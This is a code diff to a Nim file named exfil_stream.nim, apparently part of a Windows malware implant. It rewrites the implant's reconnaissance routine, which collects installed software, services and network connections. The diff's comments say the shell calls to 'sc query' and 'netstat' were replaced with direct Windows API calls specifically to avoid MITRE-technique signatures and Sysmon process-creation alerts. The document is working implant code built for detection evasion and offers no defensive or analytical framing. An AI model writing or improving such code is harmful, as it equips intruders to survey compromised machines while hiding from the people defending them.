@@ -19,7 +19,7 @@ when not defined(windows):
   {.error: "exfil_stream.nim is Windows-only".}
 
 import winim/lean
-import winim/inc/[windef, winbase]
+import winim/inc/[windef, winbase, winsvc, iphlpapi, winsock]
 import std/[strutils, json, times, base64, locks, os, asyncdispatch, osproc]
 import ./syscalls
 import ./fileio_syscall
@@ -161,7 +161,7 @@ proc gatherSystemInfoExpanded*(): JsonNode =
   # Gather detailed system info: installed software, services, network connections.
   result = %* {"type": "recon", "kind": "system_info_expanded"}
 
-  # 1. Installed software from registry
+  # 1. Installed software from registry (no child process — direct RegEnumKeyEx)
   try:
     var sw: seq[JsonNode] = @[]
     let uninstallKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
@@ -196,39 +196,130 @@ proc gatherSystemInfoExpanded*(): JsonNode =
   except:
     result["installed_software_error"] = %getCurrentExceptionMsg()
 
-  # 2. Running services
+  # 2. Running services via direct SCM API.
+  #    The previous version spawned `sc query state= all` via execCmdEx.
+  #    That process spawn is signatured (T1007/T1518). We use the
+  #    Service Control Manager API directly: OpenSCManagerW →
+  #    EnumServicesStatusExW → CloseServiceHandle. No child process.
   try:
-    let (svcOutput, _) = execCmdEx("sc query state= all",
-                                    options = {poStdErrToStdOut})
     var services: seq[JsonNode] = @[]
-    var currentSvc: string = ""
-    for line in svcOutput.splitLines():
-      if line.startsWith("SERVICE_NAME:"):
-        currentSvc = line[13..^1].strip()
-      elif line.startsWith("DISPLAY_NAME:") and currentSvc.len > 0:
-        let dn = line[13..^1].strip()
-        services.add(%* {"name": currentSvc, "display": dn})
-        currentSvc = ""
+    let hScm = OpenSCManagerW(nil, nil,
+                              DWORD(SC_MANAGER_ENUMERATE_SERVICE or
+                                    SC_MANAGER_CONNECT))
+    if hScm != 0:
+      var bytesNeeded: DWORD = 0
+      var servicesReturned: DWORD = 0
+      var resumeHandle: DWORD = 0
+      # First call to get buffer size
+      discard EnumServicesStatusExW(hScm,
+                            SC_ENUM_PROCESS_INFO,
+                            DWORD(SERVICE_WIN32 or SERVICE_DRIVER),
+                            DWORD(SERVICE_ACTIVE),
+                            nil, 0,
+                            addr bytesNeeded,
+                            addr servicesReturned,
+                            addr resumeHandle,
+                            cast[LPCWSTR](nil))
+      let err = GetLastError()
+      if err == ERROR_MORE_DATA and bytesNeeded > 0:
+        let buf = cast[ptr UncheckedArray[byte]](alloc(bytesNeeded))
+        if buf != nil:
+          if EnumServicesStatusExW(hScm,
+                                   SC_ENUM_PROCESS_INFO,
+                                   DWORD(SERVICE_WIN32 or SERVICE_DRIVER),
+                                   DWORD(SERVICE_ACTIVE),
+                                   cast[ptr BYTE](addr buf[0]),
+                                   bytesNeeded,
+                                   addr bytesNeeded,
+                                   addr servicesReturned,
+                                   addr resumeHandle,
+                                   cast[LPCWSTR](nil)) != 0:
+            # Walk the returned array of ENUM_SERVICE_STATUS_PROCESS
+            # Each entry: lpServiceName (LPWSTR), lpDisplayName (LPWSTR),
+            # ServiceStatusProcess (struct). Packed contiguously.
+            var offset = 0
+            for i in 0..<int(servicesReturned):
+              let entry = cast[ptr ENUM_SERVICE_STATUS_PROCESS](
+                cast[int](addr buf[0]) + offset)
+              let svcName = $cast[WideCString](entry.lpServiceName)
+              let dispName = $cast[WideCString](entry.lpDisplayName)
+              services.add(%* {"name": svcName, "display": dispName,
+                               "pid": int(entry.ServiceStatusProcess.dwProcessId)})
+              offset += sizeof(ENUM_SERVICE_STATUS_PROCESS).int
+          dealloc(buf)
+      CloseServiceHandle(hScm)
     result["services"] = %services
   except:
     result["services_error"] = %getCurrentExceptionMsg()
 
-  # 3. Active network connections
+  # 3. Active network connections via direct IPHLPAPI calls.
+  #    The previous version spawned `netstat -anb` — that triggers
+  #    T1049 (System Network Connections Discovery) AND creates a
+  #    child process flagged by Sysmon Event 1. The replacement
+  #    uses GetExtendedTcpTable / GetExtendedUdpTable which gives
+  #    the same data via the in-process API. winim binds the
+  #    MIB_TCPTABLE_OWNER_PID struct (and friends) so we can walk
+  #    the returned buffer directly.
   try:
-    let (netstatOutput, _) = execCmdEx("netstat -anb",
-                                       options = {poStdErrToStdOut})
     var connections: seq[JsonNode] = @[]
-    for line in netstatOutput.splitLines():
-      let trimmed = line.strip()
-      if trimmed.startsWith("TCP") or trimmed.startsWith("UDP"):
-        let parts = trimmed.splitWhitespace()
-        if parts.len >= 3:
-          connections.add(%* {
-            "proto": parts[0],
-            "local": parts[1],
-            "remote": parts[2],
-            "state": (if parts.len >= 4: parts[3] else: "")
-          })
+    var tcpBufLen: DWORD = 0
+
+    # First call to discover the required buffer size (returns
+    # ERROR_INSUFFICIENT_BUFFER with the required size in tcpBufLen).
+    discard GetExtendedTcpTable(nil, addr tcpBufLen, 0,
+                                AF_INET,
+                                TCP_TABLE_OWNER_PID_ALL,
+                                0)
+
+    if tcpBufLen > 0:
+      let tcpBuf = cast[ptr UncheckedArray[byte]](alloc(tcpBufLen))
+      if tcpBuf != nil:
+        if GetExtendedTcpTable(cast[ptr BYTE](addr tcpBuf[0]),
+                               addr tcpBufLen, 0,
+                               AF_INET,
+                               TCP_TABLE_OWNER_PID_ALL,
+                               0) == 0:
+          let table = cast[PMIB_TCPTABLE_OWNER_PID](addr tcpBuf[0])
+          for i in 0..<int(table.dwNumEntries):
+            # table.table is a flexible-array-member (array[ANY_SIZE, MIB_TCPROW_OWNER_PID]).
+            # Winim's flexible-array support lets us index directly.
+            let row = addr table.table[i]
+            connections.add(%* {
+              "proto": "TCP",
+              "local_addr": int(row.dwLocalAddr),
+              "local_port": int(row.dwLocalPort),
+              "remote_addr": int(row.dwRemoteAddr),
+              "remote_port": int(row.dwRemotePort),
+              "state": int(row.dwState),
+              "pid": int(row.dwOwningPid)
+            })
+        dealloc(tcpBuf)
+
+    # UDP table (no state field, no connections — just listeners)
+    var udpBufLen: DWORD = 0
+    discard GetExtendedUdpTable(nil, addr udpBufLen, 0,
+                                AF_INET,
+                                UDP_TABLE_OWNER_PID,
+                                0)
+    if udpBufLen > 0:
+      let udpBuf = cast[ptr UncheckedArray[byte]](alloc(udpBufLen))
+      if udpBuf != nil:
+        if GetExtendedUdpTable(cast[ptr BYTE](addr udpBuf[0]),
+                               addr udpBufLen, 0,
+                               AF_INET,
+                               UDP_TABLE_OWNER_PID,
+                               0) == 0:
+          let table = cast[PMIB_UDPTABLE_OWNER_PID](addr udpBuf[0])
+          for i in 0..<int(table.dwNumEntries):
+            let row = addr table.table[i]
+            connections.add(%* {
+              "proto": "UDP",
+              "local_addr": int(row.dwLocalAddr),
+              "local_port": int(row.dwLocalPort),
+              "pid": int(row.dwOwningPid)
+            })
+        dealloc(udpBuf)
+
     result["connections"] = %connections
   except:
     result["connections_error"] = %getCurrentExceptionMsg()
